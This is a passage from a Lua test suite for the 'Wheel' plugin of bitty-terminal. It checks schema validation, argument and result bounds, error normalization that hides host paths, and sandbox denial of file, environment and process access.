  assert_schema_valid({ type = "string", maxLength = 8 })
  assert_schema_valid({ type = "string", minLength = 1, maxLength = 8 })
  assert_schema_valid({ type = "integer", minimum = 0, maximum = 5 })
  assert_schema_valid({ type = "number", minimum = 0, maximum = 1.5 })
  assert_schema_valid({ type = "array", items = { type = "boolean" }, minItems = 1, maxItems = 2 })
  assert_schema_valid({ type = "string", maxLength = 1, enum = { "a", "b" } })
  assert_schema_valid({ type = "integer", minimum = 0, maximum = 5, enum = { 0, 5 } })
  assert_schema_valid({ type = "boolean", enum = { true, false } })
  assert_schema_valid(FUNCTION_SCHEMA)
  assert_schema_valid({
    type = "object",
    additionalProperties = false,
  })

  -- Malformed declarations fail closed with a bounded reason.
  assert_schema_invalid(nil, "expected a table")
  assert_schema_invalid("not-a-schema", "expected a table")
  assert_schema_invalid({ enum = { "a" } }, "type must be one of")
  assert_schema_invalid({ type = "null" }, "type must be one of")
  assert_schema_invalid({ type = { "string" } }, "type must be one of")
  assert_schema_invalid({ type = "boolean", pattern = "x" }, "unexpected keyword")

  -- String bounds are mandatory and ordered.
  assert_schema_invalid({ type = "string" }, "maxLength")
  assert_schema_invalid({ type = "string", maxLength = 4, minLength = 5 }, "cannot exceed maxLength")
  assert_schema_invalid({ type = "string", maxLength = 4, minimum = 0 }, "unexpected keyword")

  -- Numeric bounds are mandatory, finite, ordered, and integral for integers.
  assert_schema_invalid({ type = "integer", minimum = 0 }, "maximum")
  assert_schema_invalid({ type = "number", maximum = 1 }, "minimum")
  assert_schema_invalid({ type = "integer", minimum = 0.5, maximum = 2 }, "integer bounds")
  assert_schema_invalid({ type = "integer", minimum = 3, maximum = 2 }, "cannot exceed maximum")
  assert_schema_invalid({ type = "number", minimum = 0 / 0, maximum = 1 }, "finite minimum")
  assert_schema_invalid({ type = "number", minimum = 0, maximum = math.huge }, "finite maximum")

  -- Arrays require an item schema and bounded length.
  assert_schema_invalid({ type = "array", maxItems = 1 }, "require items")
  assert_schema_invalid({ type = "array", items = { type = "boolean" } }, "maxItems")
  assert_schema_invalid({ type = "array", items = { type = "boolean" }, maxItems = 2, minItems = 3 },
    "cannot exceed maxItems")
  assert_schema_invalid({ type = "array", items = { type = "boolean" }, maxItems = 2, enum = { true } },
    "unexpected keyword")

  -- Objects require closed properties and declared required fields.
  assert_schema_invalid({ type = "object" }, "additionalProperties")
  assert_schema_invalid({ type = "object", additionalProperties = true },
    "additionalProperties = false")
  -- An empty `properties` table cannot cross the bridge: the host encodes an
  -- empty Lua table as a JSON array, so a closed empty object omits the key.
  assert_schema_invalid({ type = "object", properties = {}, additionalProperties = false },
    "omit properties")
  assert_schema_invalid({
    type = "object",
    properties = { name = { type = "boolean" } },
    required = { "missing" },
    additionalProperties = false,
  }, "not declared")
  assert_schema_invalid({
    type = "object",
    properties = { badName = { type = "boolean" } },
    additionalProperties = false,
  }, "lower_snake_case")
  assert_schema_invalid({
    type = "object",
    properties = { [string.rep("a", 65)] = { type = "boolean" } },
    additionalProperties = false,
  }, "property name length")
  assert_schema_invalid({
    type = "object",
    properties = { child = "not-a-schema" },
    additionalProperties = false,
  }, "expected a table")
  assert_schema_invalid({
    type = "object",
    properties = { name = { type = "boolean" } },
    required = "name",
    additionalProperties = false,
  }, "expected an array")
  assert_schema_invalid({
    type = "object",
    properties = { name = { type = "boolean" } },
    required = { [1] = "name", [3] = "name" },
    additionalProperties = false,
  }, "contiguous array")

  -- Enums are non-empty, bounded, type-matched, and unique.
  assert_schema_invalid({ type = "boolean", enum = {} }, "must not be empty")
  assert_schema_invalid({ type = "boolean", enum = { "yes" } }, "does not match type")
  assert_schema_invalid({ type = "integer", minimum = 0, maximum = 5, enum = { 1, 1 } }, "duplicate")
  assert_schema_invalid({ type = "string", maxLength = 2, enum = { "abc" } }, "length bounds")
  assert_schema_invalid({ type = "integer", minimum = 0, maximum = 2, enum = { 3 } }, "numeric bounds")
  assert_schema_invalid({ type = "object", additionalProperties = false, enum = {} },
    "unexpected keyword")
  assert_schema_invalid({ type = "string", maxLength = 3, enum = { "a", "b", "c", "d", "e", "f", "g", "h", "i",
    "j", "k", "l", "m", "n", "o", "p", "q" } }, "exceeds")

  -- Property, required, byte, node, and depth ceilings are enforced.
  local many_properties = {}
  for index = 1, WheelSchema.LIMITS.SCHEMA_MAX_PROPERTIES + 1 do
    many_properties["p" .. index] = { type = "boolean" }
  end
  assert_schema_invalid({
    type = "object",
    properties = many_properties,
    additionalProperties = false,
  }, "declared properties")

  local required_properties = {}
  local required_fields = {}
  for index = 1, WheelSchema.LIMITS.SCHEMA_MAX_REQUIRED + 1 do
    local name = "p" .. index
    required_properties[name] = { type = "boolean" }
    required_fields[index] = name
  end
  assert_schema_invalid({
    type = "object",
    properties = required_properties,
    required = required_fields,
    additionalProperties = false,
  }, "required: exceeds")

  local oversized_enum = {}
  for index = 1, WheelSchema.LIMITS.SCHEMA_MAX_ENUM_VALUES do
    oversized_enum[index] = string.rep("x", 1024)
  end
  assert_schema_invalid({ type = "string", maxLength = 1024, enum = oversized_enum }, "bytes")

  local deep = { type = "boolean" }
  for _ = 1, WheelSchema.LIMITS.SCHEMA_MAX_DEPTH + 2 do
    deep = {
      type = "object",
      properties = { child = deep },
      required = { "child" },
      additionalProperties = false,
    }
  end
  assert_schema_invalid(deep, "depth")

  local cyclic = { type = "object", properties = {}, required = {}, additionalProperties = false }
  cyclic.properties.self = cyclic
  assert_schema_invalid(cyclic, "cyclic")
end)

run_test("WheelSchema: argument and result value validation", function()
  -- Minimal and full argument sets are accepted.
  assert_args_valid(FUNCTION_SCHEMA, { name = "ok" })
  assert_args_valid(FUNCTION_SCHEMA, {
    name = "ok",
    retries = 5,
    ratio = 1,
    dry_run = false,
    tags = { "a", "b" },
    nested = { mode = "b" },
  })

  -- Unknown and missing fields are rejected before any handler could run.
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", extra = true }, "unknown field")
  assert_args_invalid(FUNCTION_SCHEMA, { retries = 1 }, "required field is missing")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", nested = {} }, "required field is missing")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", nested = { mode = "a", extra = true } },
    "unknown field")

  -- Type, length, range, array, and enum bounds are enforced.
  assert_args_invalid(FUNCTION_SCHEMA, { name = "" }, "length is below 1")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "123456789" }, "length exceeds 8")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", retries = 1.5 }, "expected an integer")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", retries = -1 }, "outside the declared range")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", retries = 6 }, "outside the declared range")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", ratio = "x" }, "expected a finite number")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", ratio = 2 }, "outside the declared range")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", dry_run = 1 }, "expected a boolean")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", tags = {} }, "at least 1 items")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", tags = { "a", "b", "c", "d" } }, "exceeds 3 items")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", tags = { 1 } }, "expected a string")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", tags = { [1] = "a", [3] = "c" } }, "contiguous array")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", tags = { a = "x" } }, "contiguous array")
  assert_args_invalid(FUNCTION_SCHEMA, { name = "ok", nested = { mode = "c" } }, "declared enum")
  assert_args_invalid(FUNCTION_SCHEMA, "not-a-table", "expected an object")
  assert_args_invalid(FUNCTION_SCHEMA, false, "expected an object")
  assert_args_invalid(FUNCTION_SCHEMA, setmetatable({ name = "ok" }, {}), "plain table")

  -- A nil argument set is the empty object, accepted only by a closed empty
  -- schema; a schema with required fields still rejects it.
  local empty_schema = { type = "object", additionalProperties = false }
  assert_args_valid(empty_schema, nil)
  assert_args_invalid(FUNCTION_SCHEMA, nil, "required field is missing")

  -- Result schemas use the same validator and the same bounds.
  local result_schema = {
    type = "object",
    properties = {
      title = { type = "string", minLength = 1, maxLength = 64 },
      body = { type = "string", minLength = 1, maxLength = 128 },
    },
    required = { "title", "body" },
    additionalProperties = false,
  }
  local function result_ok(value)
    local ok = WheelSchema.validate_value(result_schema, value, "$result")
    return ok
  end
  assert(result_ok({ title = "Wheel", body = "ok" }), "minimal result must be accepted")
  assert(not result_ok({ title = "Wheel" }), "missing result field must be rejected")
  assert(not result_ok({ title = "", body = "ok" }), "empty result title must be rejected")
  assert(not result_ok({ title = string.rep("x", 65), body = "ok" }), "oversized title must be rejected")
  assert(not result_ok({ title = "Wheel", body = "" }), "empty result body must be rejected")
  assert(not result_ok({ title = "Wheel", body = string.rep("x", 129) }), "oversized body must be rejected")
  assert(not result_ok({ title = "Wheel", body = "ok", extra = true }), "unknown result field must be rejected")
end)

run_test("WheelSchema: value admission limits and sparse arrays", function()
  -- Depth: a legal declaration can be deeper than the invocation limit.
  local depth_schema = { type = "boolean" }
  for _ = 1, WheelSchema.LIMITS.VALUE_MAX_DEPTH + 1 do
    depth_schema = {
      type = "object",
      properties = { child = depth_schema },
      required = { "child" },
      additionalProperties = false,
    }
  end
  local depth_value = true
  for _ = 1, WheelSchema.LIMITS.VALUE_MAX_DEPTH + 1 do
    depth_value = { child = depth_value }
  end
  local depth_ok, depth_reason = WheelSchema.validate_value(depth_schema, depth_value)
  assert(not depth_ok, "value depth above VALUE_MAX_DEPTH must be rejected")
  assert(depth_reason:find("depth", 1, true) ~= nil,
    "depth rejection must name the depth bound: " .. tostring(depth_reason))

  -- Nodes: one boolean per array item plus the root and array node.
  local node_schema = {
    type = "array",
    items = { type = "boolean" },
    maxItems = WheelSchema.LIMITS.VALUE_MAX_NODES,
  }
  local node_value = {}
  for index = 1, WheelSchema.LIMITS.VALUE_MAX_NODES do
    node_value[index] = true
  end
  local node_ok, node_reason = WheelSchema.validate_value(node_schema, node_value)
  assert(not node_ok, "value node count above VALUE_MAX_NODES must be rejected")
  assert(node_reason:find("node count", 1, true) ~= nil,
    "node rejection must name the node bound: " .. tostring(node_reason))

  -- Bytes: two maximum-sized strings exceed the value byte budget.
  local half = math.floor(WheelSchema.LIMITS.VALUE_MAX_BYTES / 2)
  local byte_schema = {
    type = "array",
    items = { type = "string", maxLength = half },
    maxItems = 2,
  }
  local byte_ok, byte_reason = WheelSchema.validate_value(byte_schema, {
    string.rep("x", half),
    string.rep("y", half),
  })
  assert(not byte_ok, "value bytes above VALUE_MAX_BYTES must be rejected")
  assert(byte_reason:find("bytes", 1, true) ~= nil,
    "byte rejection must name the byte bound: " .. tostring(byte_reason))

  -- A sparse table is rejected from its keys, not by walking to the highest
  -- index: the validator must remain bounded for hostile input.
  local sparse_schema = {
    type = "array",
    items = { type = "boolean" },
    maxItems = 2,
  }
  local sparse_ok, sparse_reason = WheelSchema.validate_value(sparse_schema, {
    [1] = true,
    [1000000000] = true,
  })
  assert(not sparse_ok, "a sparse oversized array must be rejected")
  assert(sparse_reason:find("exceeds 2 items", 1, true) ~= nil,
    "sparse rejection must name the item bound: " .. tostring(sparse_reason))
end)

run_test("Wheel Init: command schemas and invocation validation", function()
  package.loaded["wheel.init"] = nil
  local capture = new_command_capture()
  local notifications = {}

  _G.bitty = {
    commands = {
      register = capture.register,
    },
    notify = {
      show = function(payload)
        table.insert(notifications, payload)
        return true
      end,
    },
  }

  local wheel = require("wheel.init")
  assert(type(wheel.command_catalog) == "table", "init must expose its command table")
  assert(#wheel.command_catalog == #EXPECTED_COMMANDS,
    "command table must carry the full catalog")

  assert_command_catalog(capture)

  for index, expected in ipairs(EXPECTED_COMMANDS) do
    local def = capture.defs[expected.id]
    assert(def == wheel.command_catalog[index],
      "catalog order drifted for " .. expected.id)
    assert(def.args_schema.type == "object", "command arguments must be an object for " .. expected.id)
    assert(def.args_schema.additionalProperties == false,
      "command arguments must reject unknown fields for " .. expected.id)
    if expected.id == "trust" then
      assert(type(def.args_schema.properties) == "table",
        "trust must declare its optional action/hash/path fields")
      assert_args_valid(def.args_schema, { action = "show" })
      assert_args_valid(def.args_schema, { action = "confirm", hash = string.rep("a", 64) })
      assert_args_invalid(def.args_schema, { action = "yes" }, "enum")
      assert_args_invalid(def.args_schema, { action = "confirm", hash = string.rep("a", 63) })
    else
      assert(def.args_schema.properties == nil,
        "the current command contract declares no argument properties for " .. expected.id)
    end
    assert_args_valid(def.args_schema, {})
    assert_args_invalid(def.args_schema, { unexpected = true }, "unknown field")

    -- Every command registers a result schema; the minimal projection is
    -- accepted and a missing required field is rejected.
    local result_ok, result_reason = WheelSchema.validate_value(
      def.result_schema, { title = "Wheel", body = "ok" }, "$result")
    assert(result_ok, "invalid command result schema for " .. expected.id .. ": " .. tostring(result_reason))
    local missing_ok = WheelSchema.validate_value(def.result_schema, { title = "Wheel" }, "$result")
    assert(not missing_ok, "result schema must require a body for " .. expected.id)
  end

  local hello = capture.defs["hello"]
  local ok, result = pcall(hello.run, {})
  assert(ok, "hello must accept an empty argument set: " .. tostring(result))
  assert(result.title == "Wheel", "hello result title drifted")
  assert(result.body == "Hello from bitty-terminal.wheel (Bittie 🐹).", "hello result body drifted")
  local result_ok, result_reason = WheelSchema.validate_value(hello.result_schema, result, "$result")
  assert(result_ok, "hello result must satisfy its registered schema: " .. tostring(result_reason))
  assert(#notifications == 1 and notifications[1].title == "Wheel",
    "hello must still emit exactly one notification")

  local bad_ok, bad_err = pcall(hello.run, { unexpected = true })
  assert(not bad_ok, "unknown arguments must fail closed")
  local typed = assert_typed_error(bad_err, "E_ARGS_INVALID", "validation")
  assert(typed.message:find("invalid arguments", 1, true) ~= nil,
    "argument rejection must use the typed validation wording")
  assert(typed.message:find("unknown field", 1, true) ~= nil,
    "argument rejection must name the offending field")
  assert(#typed.message <= WheelErrors.MESSAGE_MAX_LENGTH,
    "argument rejection must stay within the message bound")

  local non_table_ok, non_table_err = pcall(hello.run, "not-a-table")
  assert(not non_table_ok, "non-table arguments must fail closed")
  assert_typed_error(non_table_err, "E_ARGS_INVALID", "validation")

  -- An untrusted field name must not be able to forge a second log line.
  local control_ok, control_err = pcall(hello.run, { ["bad\nfield"] = true })
  assert(not control_ok, "a control-character field name must fail closed")
  local control = assert_typed_error(control_err, "E_ARGS_INVALID", "validation")
  assert(control.message:find("\n", 1, true) == nil,
    "argument rejection must stay on one line")

  -- The result schema is a real contract: a value that drifts from it is
  -- rejected by the same validator the dispatch wrapper uses.
  local drift_ok = WheelSchema.validate_value(hello.result_schema, { title = "Wheel" }, "$result")
  assert(not drift_ok, "a result missing its body must be rejected")

  _G.bitty = nil
  package.loaded["wheel.init"] = nil
end)

run_test("WheelCommands: host-bounded results and dispatch validation", function()
  local captured = {}
  local host = {
    commands = {
      register = function(def)
        captured[def.id] = def
      end,
    },
    notify = {
      show = function()
        return true
      end,
    },
  }

  local cap = WheelCommands.RESULT_BODY_MAX_LENGTH
  assert(WheelCommands.HOST_RESULT_MAX_BYTES == 8 * 1024,
    "host result budget must mirror DEFAULT_MAX_VALUE_BYTES")
  assert(cap == WheelCommands.HOST_RESULT_MAX_BYTES
      - WheelCommands.RESULT_ENVELOPE_MAX_BYTES
      - WheelCommands.RESULT_TITLE_MAX_LENGTH,
    "body bound must reserve the envelope and title")
  assert(cap < WheelCommands.HOST_RESULT_MAX_BYTES, "body bound must fit the host cap")

  local result_schema = WheelCommands.notification_result_schema()
  assert_schema_valid(result_schema)

  local function assert_host_fits(result)
    -- Host `LuaValue::from_lua` charges string bytes for the two keys, the
    -- title, and the body.
    assert(#result.title + #result.body + 5 + 4 <= WheelCommands.HOST_RESULT_MAX_BYTES,
      "host string budget exceeded")
  end

  -- A body exactly at the cap is unchanged and valid.
  local at_cap = WheelCommands.notify(host, "Wheel", string.rep("a", cap))
  assert(#at_cap.body == cap, "a body at the cap must not be shortened")
  local ok, reason = WheelSchema.validate_value(result_schema, at_cap, "$result")
  assert(ok, "a body at the cap must validate: " .. tostring(reason))
  assert_host_fits(at_cap)

  -- A body over the cap is truncated to the cap and remains valid.
  local over = WheelCommands.notify(host, "Wheel", string.rep("a", cap + 100))
  assert(#over.body == cap, "an oversized body must be truncated to the cap")
  assert(over.body:sub(-3) == "...", "truncation must be marked with an ellipsis")
  ok, reason = WheelSchema.validate_value(result_schema, over, "$result")
  assert(ok, "a truncated result must validate: " .. tostring(reason))
  assert_host_fits(over)

  -- The worst-case title plus body stays under the host cap.
  local max_title = WheelCommands.notify(
    host,
    string.rep("T", WheelCommands.RESULT_TITLE_MAX_LENGTH),
    string.rep("b", cap))
  assert_host_fits(max_title)

  -- UTF-8 boundaries: the raw cut would land inside 2- and 4-byte sequences.
  local cut = cap - 3
  local sequences = {
    { name = "2-byte", bytes = string.char(0xC3, 0xA9) },
    { name = "4-byte", bytes = string.char(0xF0, 0x9F, 0x90, 0xB9) },
  }
  for _, sequence in ipairs(sequences) do
    local body = string.rep("a", cut - 1) .. sequence.bytes .. string.rep("b", 16)
    assert(#body > cap, sequence.name .. " fixture must exceed the cap")
    local truncated = WheelCommands.truncate_body(body)
    assert(#truncated <= cap, sequence.name .. " truncation must respect the cap")
    assert(truncated:sub(-3) == "...", sequence.name .. " truncation must be marked")
    assert_valid_utf8(truncated)
    assert(truncated:sub(-4, -4) == "a",
      sequence.name .. " truncation must back off the split code point")
  end

  -- The real registered hello result schema accepts the bounded projection.
  package.loaded["wheel.init"] = nil
  _G.bitty = host
  local wheel = require("wheel.init")
  local hello = captured["hello"]
  assert(hello ~= nil, "hello must be registered")
  assert(wheel.command_catalog[1] == hello, "hello must be the first catalog entry")
  local real_truncated = WheelCommands.notify(host, "Wheel", string.rep("x", cap * 2))
  local real_ok, real_reason = WheelSchema.validate_value(hello.result_schema, real_truncated, "$result")
  assert(real_ok, "a truncated result must satisfy the registered schema: " .. tostring(real_reason))
  assert_host_fits(real_truncated)

  -- A handler that returns an over-bound result without truncation is
  -- contained by the dispatch wrapper.
  local over_bound = {
    id = "over-bound-result",
    title = "Test: over bound",
    description = "Test fixture.",
    args_schema = WheelCommands.no_args_schema(),
    result_schema = WheelCommands.notification_result_schema(),
    run = function()
      return { title = "Wheel", body = string.rep("x", cap + 1) }
    end,
  }
  WheelCommands.register(over_bound, host)
  local bound_ok, bound_err = pcall(over_bound.run)
  assert(not bound_ok, "an over-bound handler result must fail closed")
  assert_typed_error(bound_err, "E_RESULT_INVALID", "validation")

  -- Invalid arguments are rejected before the handler runs.
  local handler_ran = false
  local invalid_args = {
    id = "invalid-args",
    title = "Test: invalid args",
    description = "Test fixture.",
    args_schema = WheelCommands.no_args_schema(),
    result_schema = WheelCommands.notification_result_schema(),
    run = function()
      handler_ran = true
      return { title = "Wheel", body = "ok" }
    end,
  }
  WheelCommands.register(invalid_args, host)
  local args_ok, args_err = pcall(invalid_args.run, { unexpected = true })
  assert(not args_ok, "invalid arguments must fail closed")
  assert(handler_ran == false, "the handler must not run on invalid arguments")
  assert_typed_error(args_err, "E_ARGS_INVALID", "validation")

  -- The registration entry point rejects an invalid schema with a typed
  -- validation failure before the host captures the definition.
  local bad_schema = {
    id = "bad-schema",
    title = "Test: bad schema",
    description = "Test fixture.",
    args_schema = { type = "object", properties = {}, additionalProperties = false },
    result_schema = WheelCommands.notification_result_schema(),
    run = function()
      return { title = "Wheel", body = "ok" }
    end,
  }
  local schema_ok, schema_err = pcall(WheelCommands.register, bad_schema, host)
  assert(not schema_ok, "an invalid command schema must fail registration")
  assert_typed_error(schema_err, "E_SCHEMA_INVALID", "validation")

  local bad_result_schema = {
    id = "bad-result-schema",
    title = "Test: bad result schema",
    description = "Test fixture.",
    args_schema = WheelCommands.no_args_schema(),
    result_schema = { type = "string" },
    run = function()
      return "ok"
    end,
  }
  local result_schema_ok, result_schema_err = pcall(WheelCommands.register, bad_result_schema, host)
  assert(not result_schema_ok, "an invalid result schema must fail registration")
  assert_typed_error(result_schema_err, "E_SCHEMA_INVALID", "validation")

  _G.bitty = nil
  package.loaded["wheel.init"] = nil
end)

run_test("WheelErrors: typed capability and internal classification", function()
  -- Unambiguous global wording normalizes to a typed capability denial.
  local legacy_global = WheelErrors.normalize(
    "lua/wheel/init.lua:195: attempt to index global 'io' (a nil value)", "trust")
  assert_sandbox_denial(legacy_global, "fs.read")

  local modern_global = WheelErrors.normalize(
    "lua/wheel/init.lua:195: attempt to index a nil value (global 'io')", "trust")
  assert_sandbox_denial(modern_global, "fs.read")

  local legacy_os = WheelErrors.normalize(
    "lua/wheel/config.lua:340: attempt to index global 'os' (a nil value)", "plan")
  assert_sandbox_denial(legacy_os, "env.read")

  local modern_os = WheelErrors.normalize(
    "lua/wheel/config.lua:340: attempt to index a nil value (global 'os')", "plan")
  assert_sandbox_denial(modern_os, "env.read")

  -- A bare field name has no owning table and must not be classified as a
  -- capability; it is an ordinary Wheel defect.
  local legacy_field = WheelErrors.normalize(
    "lua/wheel/provider.lua:661: attempt to call field 'getenv' (a nil value)", "orchestrate")
  assert_typed_error(legacy_field, "E_INTERNAL")

  local modern_field = WheelErrors.normalize(
    "lua/wheel/provider.lua:661: attempt to call a nil value (field 'getenv')", "orchestrate")
  assert_typed_error(modern_field, "E_INTERNAL")

  -- Regression: a missing standard table helper is a Wheel bug, not a
  -- filesystem denial.
  local saved_table_remove = table.remove
  table.remove = nil
  local table_bug_ok, table_bug_err = pcall(WheelErrors.wrap("table-bug", function()
    return table.remove({ 1 }, 1)
  end))
  table.remove = saved_table_remove

  assert(not table_bug_ok, "a missing table helper must fail the handler")
  assert_typed_error(table_bug_err, "E_INTERNAL")

  -- An unexpected failure stays generic and never echoes its raw message.
  local internal = assert_typed_error(
    WheelErrors.normalize("boom: /host/path leaked", "plan"), "E_INTERNAL")
  assert(internal.message == "internal error in wheel command 'plan'",
    "internal failure must stay generic")
  assert(internal.message:find("host/path", 1, true) == nil,
    "internal failure must not leak a host path")

  -- An already-typed host denial passes through unchanged.
  local passthrough = WheelErrors.capability_denied("env.read")
  assert(WheelErrors.normalize(passthrough, "plan") == passthrough,
    "typed denials must pass through the dispatch boundary unchanged")

  -- Tables are shape-enforced: extra fields and oversized messages become
  -- E_INTERNAL rather than leaking a malformed public error.
  local extra_field = WheelErrors.capability_denied("env.read")
  extra_field.extra = true
  assert_typed_error(WheelErrors.normalize(extra_field, "plan"), "E_INTERNAL")

  local oversized = WheelErrors.capability_denied("env.read")
  oversized.message = string.rep("x", WheelErrors.MESSAGE_MAX_LENGTH + 1)
  assert_typed_error(WheelErrors.normalize(oversized, "plan"), "E_INTERNAL")

  -- The dispatch-budget sentinel is explicitly marked opaque and keeps its
  -- identity through the boundary.
  local sentinel = WheelErrors.passthrough({ reason = "budget" })
  assert(WheelErrors.normalize(sentinel, "plan") == sentinel,
    "a marked passthrough value must keep its identity")

  -- A forged public marker must not grant passthrough: the marker is a
  -- module-local token, so this table is shape-enforced to E_INTERNAL and
  -- none of its fields leak.
  local forged_ok, forged_err = pcall(WheelErrors.wrap("forged-passthrough", function()
    error({
      __wheel_passthrough = true,
      message = string.rep("x", 1000),
      secret = "/host/path",
    }, 0)
  end))
  assert(not forged_ok, "a forged passthrough table must fail the handler")
  local forged = assert_typed_error(forged_err, "E_INTERNAL")
  assert(forged.message == "internal error in wheel command 'forged-passthrough'",
    "a forged passthrough table must become a generic internal error")
  assert(forged.__wheel_passthrough == nil, "a forged marker must not survive normalization")
  assert(forged.secret == nil, "forged extra fields must not survive normalization")
  assert(forged.message:find("xxxx", 1, true) == nil, "a forged message must not survive normalization")
end)

run_test("Wheel Init: host sandbox activation and denial paths", function()
  local capture = new_command_capture()
  local notifications = {}

  run_in_host_sandbox(function()
    -- Fixture preconditions: authority-relevant surface of the accepted v1
    -- Lua sandbox. Other os entries are intentionally not modeled.
    assert(_G.io == nil, "sandbox must remove io")
    assert(_G.loadfile == nil and _G.dofile == nil, "sandbox must remove file-based loading")
    assert(type(os) == "table", "sandbox retains the os table")
    assert(os.execute == nil, "sandbox must remove os.execute")
    assert(os.getenv == nil, "sandbox must remove os.getenv")
    assert(os.tmpname == nil, "sandbox must remove os.tmpname")
    assert(os.remove == nil, "sandbox must remove os.remove")
    assert(type(os.time) == "function", "sandbox retains os.time")
    assert(type(os.clock) == "function", "sandbox retains os.clock")
    assert(type(os.date) == "function", "sandbox retains os.date")

    local budget_enforced = type(debug) == "table" and type(debug.sethook) == "function"
    if not budget_enforced then
      print("[SKIP] host-sandbox dispatch ceiling: debug.sethook is unavailable in " .. _VERSION)
    end

    _G.bitty = {
      commands = {
        register = capture.register,
      },
      notify = {
        show = function(payload)
          table.insert(notifications, payload)
          return true
        end,
      },
    }

    -- Fresh package state: every Wheel submodule loads under the sandbox.
    local wheel = require("wheel.init")
    assert(type(wheel) == "table", "activation must return the module table")
    assert(type(wheel.kernel) == "table", "activation must instantiate the kernel")
    assert_command_catalog(capture)

    for _, expected in ipairs(EXPECTED_COMMANDS) do
      local def = capture.defs[expected.id]
      local denial = SANDBOX_DENIALS[expected.id]
      local notifications_before = #notifications

      local ok, err, enforced = dispatch_with_budget(def)
      assert(enforced == budget_enforced, "dispatch budget enforcement drifted for " .. expected.id)
      assert(err ~= SANDBOX_BUDGET_EXCEEDED,
        string.format("%s exceeded the sandbox dispatch budget (%ds CPU or %d instructions)",
          expected.id, SANDBOX_DISPATCH_TIMEOUT_SECONDS, SANDBOX_DISPATCH_INSTRUCTION_BUDGET))
      assert(#capture.order == #EXPECTED_COMMANDS,
        "command dispatch must not register or duplicate commands: " .. expected.id)

      if denial then
        assert(not ok, expected.id .. " must be denied without host authority")
        assert_sandbox_denial(err, denial)
        assert(#notifications == notifications_before,
          expected.id .. " must not emit a notification when denied")
      else
        assert(ok, expected.id .. " must complete under the host sandbox: " .. tostring(err))
        assert(#notifications == notifications_before + 1,
          expected.id .. " must emit exactly one notification")
        assert(notifications[#notifications].title == SANDBOX_HANDLED_TITLES[expected.id],
          expected.id .. " emitted an unexpected notification title")
        local expected_body = SANDBOX_HANDLED_BODIES[expected.id]
        if expected_body then
          assert(notifications[#notifications].body == expected_body,
            expected.id .. " emitted an unexpected notification body")
        end
      end
    end

    -- run with no ready task is a handled return above; with a ready task it
    -- reaches the same unavailable project-config authority as plan.
    local ready_task = wheel.kernel:create_task({
      id = "CTX-SANDBOX-READY",
      title = "Sandbox ready task",
    })
    assert(ready_task ~= nil, "sandbox fixture must seed a ready task")

    local notifications_before = #notifications
    local ok, err, enforced = dispatch_with_budget(capture.defs["run"])
    assert(enforced == budget_enforced, "dispatch budget enforcement drifted for seeded run")
    assert(err ~= SANDBOX_BUDGET_EXCEEDED,
      string.format("run with a ready task exceeded the sandbox dispatch budget (%ds CPU or %d instructions)",
        SANDBOX_DISPATCH_TIMEOUT_SECONDS, SANDBOX_DISPATCH_INSTRUCTION_BUDGET))
    assert(not ok, "run with a ready task must be denied without host authority")
    assert_sandbox_denial(err, SANDBOX_DENIALS.plan)
    assert(#notifications == notifications_before,
      "denied run must not emit a notification")
    assert(#capture.order == #EXPECTED_COMMANDS,
      "denied run must not register or duplicate commands")

    -- A defect inside a handler must remain a distinguishable generic internal
    -- error; it must never be reported as a capability denial.
    local original_list_tasks = wheel.kernel.list_tasks
    wheel.kernel.list_tasks = function()
      error("simulated internal defect with /host/path", 0)
    end
    local internal_notifications_before = #notifications
    local internal_ok, internal_err, internal_enforced = dispatch_with_budget(capture.defs["run"])
    wheel.kernel.list_tasks = original_list_tasks

    assert(internal_enforced == budget_enforced, "dispatch budget enforcement drifted for internal failure")
    assert(not internal_ok, "an internal defect must fail the command")
    local internal = assert_typed_error(internal_err, "E_INTERNAL")
    assert(internal.message == "internal error in wheel command 'run'",
      "internal failure must stay generic")
    assert(internal.message:find("capability", 1, true) == nil,
      "internal failure must not be reported as a capability denial")
    assert(internal.message:find("host/path", 1, true) == nil,
      "internal failure must not leak a host path")
    assert(#notifications == internal_notifications_before,
      "an internal failure must not emit a notification")
    assert(#capture.order == #EXPECTED_COMMANDS,
      "an internal failure must not register or duplicate commands")

    -- The dispatch boundary itself recognizes a raw nil-surface failure, so a
    -- future unguarded call site still yields a typed capability denial.
    local fallback = WheelErrors.wrap("sandbox-fallback", function()
      return io.open("denied", "r")
    end)
    local fallback_ok, fallback_err, fallback_enforced = dispatch_with_budget({ run = fallback })
    assert(fallback_enforced == budget_enforced, "dispatch budget enforcement drifted for fallback denial")
    assert(not fallback_ok, "a raw nil-surface failure must be denied at the dispatch boundary")
    assert_sandbox_denial(fallback_err, "fs.read")

    -- Direct guard coverage for the write, process, and temp surfaces.
    local function assert_host_denial(call, capability)
      local host_ok, host_err = pcall(call)
      assert(not host_ok, "host surface must be denied without authority")
      assert_sandbox_denial(host_err, capability)
    end

    assert_host_denial(function()
      return WheelHost.fs.write_file("denied.txt", "x")
    end, "fs.write")
    assert_host_denial(function()
      return WheelHost.proc.run_command("true")
    end, "process.spawn")
    assert_host_denial(function()
      return WheelHost.tmp.name()
    end, "fs.write")
  end)
end)

-- CTX-0008 measured the eager activation payload at 269,708 source bytes across
-- 11 files. CTX-0014 keeps only the required registration/status surface eager;
-- the bound below is half that baseline and leaves room for bounded diagnostics.
local ACTIVATION_EAGER_SOURCE_BUDGET_BYTES = 134854

local EAGER_ACTIVATION_MODULES = {
  "init", "errors", "schema", "commands", "kernel", "ui",
}

local LAZY_ACTIVATION_MODULES = {
  "agent", "config", "team", "context", "tool", "provider", "runner", "host",
}

local function read_eager_activation_bytes()
  local total = 0
  for _, name in ipairs(EAGER_ACTIVATION_MODULES) do
    local path = "lua/wheel/" .. name .. ".lua"
